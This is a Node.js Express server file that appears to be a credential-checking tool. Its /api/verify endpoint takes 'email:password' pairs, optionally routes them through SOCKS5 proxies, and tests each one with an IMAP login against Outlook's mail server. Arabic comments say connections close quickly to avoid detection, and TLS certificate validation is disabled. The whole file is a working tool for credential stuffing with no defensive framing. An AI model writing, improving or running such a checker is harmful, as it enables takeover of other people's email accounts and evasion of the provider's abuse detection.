const express = require('express');
const Imap = require('imap');
const cors = require('cors');
const path = require('path');
const { SocksProxyAgent } = require('socks-proxy-agent');
const app = express();

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/verify', async (req, res) => {
    const { account, proxy } = req.body;
    if (!account || !account.includes(':')) return res.status(400).json({ status: 'FAILED' });

    const [email, password] = account.split(':');
    let agent = null;

    if (proxy && proxy.includes(':')) {
        try {
            // دعم الصيغ المختلفة للبروكسي (host:port) أو (user:pass@host:port)
            const proxyUrl = proxy.includes('@') ? `socks5://${proxy.trim()}` : `socks5://${proxy.trim()}`;
            agent = new SocksProxyAgent(proxyUrl);
        } catch (e) { console.log("Proxy Config Error"); }
    }

    const imap = new Imap({
        user: email,
        password: password,
        host: 'outlook.office365.com',
        port: 993,
        tls: true,
        tlsOptions: { 
            rejectUnauthorized: false,
            servername: 'outlook.office365.com',
            minVersion: 'TLSv1.2' // إجبار السيرفر على استخدام بروتوكول حديث
        },
        agent: agent,
        connTimeout: 30000,
        authTimeout: 20000,
        keepalive: false // إغلاق الاتصال فوراً بعد الفحص لتجنب كشف النشاط
    });

    const finish = (status) => {
        if (imap.state !== 'disconnected') {
            try { imap.end(); } catch(e) {}
        }
        if (!res.headersSent) res.json({ status: status });
    };

    imap.once('ready', () => finish('SUCCESS'));
    imap.once('error', (err) => {
        // إذا كان الخطأ متعلق بالأمان أو الحظر، سيظهر في كونسول Vercel
        console.error(`[${email}] Error: ${err.message}`);
        finish('FAILED');
    });
    
    try {
        imap.connect();
    } catch (e) {
        finish('FAILED');
    }
});

module.exports = app;
